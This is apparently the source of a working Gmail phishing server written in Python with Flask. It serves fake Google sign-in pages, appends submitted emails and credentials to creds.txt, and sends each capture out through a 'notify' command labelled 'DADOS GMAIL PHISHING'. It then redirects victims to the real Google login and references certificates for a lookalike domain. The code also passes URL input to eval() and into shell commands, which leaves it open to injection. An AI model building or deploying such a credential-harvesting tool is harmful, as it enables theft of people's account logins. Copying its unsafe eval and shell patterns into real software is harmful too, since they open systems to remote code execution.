from flask import Flask, request, render_template, redirect
import os
from flask_sslify import SSLify

app = Flask(__name__)

app.config['TEMPLATES_AUTO_RELOAD'] = True

@app.route("/")
def page1():
   return render_template("page1.html")

@app.route("/signin/v2/identifier")
def page2():
   return render_template("page2.html")

@app.route("/logger/<func>", methods=["GET","POST"])
def logger(func):
  if request.method == "POST":
    data = request.form["emailid"]
    f = open("creds.txt", "a")
    f.write(data)
    f.write("\n")
    f.close()

    if eval(func) == 1:
      return redirect("/signin/v2/identifier")
    if eval(func) == 2:
      return redirect("https://accounts.google.com")

@app.route("/logger/<data>/<func>", methods=["GET", "POST"])
def logger1(data, func):
    f = open("creds.txt", "a")
    f.write(data)
    f.write("\n")
    f.close()

    email = os.popen('tail -n 1 creds.txt').read().strip()
    os.system("sed -i 's#<test>\(.*\)</test>#<test>" + email.replace("$", "\$") + "</test>#g' ./templates/page2.html")

    os.system ('echo "DADOS GMAIL PHISHING:" > tmp.txt && tail -n 1 creds.txt >> tmp.txt && notify -data tmp.txt -bulk -silent && rm tmp.txt')
    if eval(func) == 1:
      return redirect("/signin/v2/identifier")
    if eval(func) == 2:
      return redirect("https://accounts.google.com")

app.run(host='0.0.0.0', port=7632)
#app.run(ssl_context=('/etc/letsencrypt/live/glogin.mooo.com/cert.pem', '/etc/letsencrypt/live/glogin.mooo.com/privkey.pem'), host='0.0.0.0', port=7632)
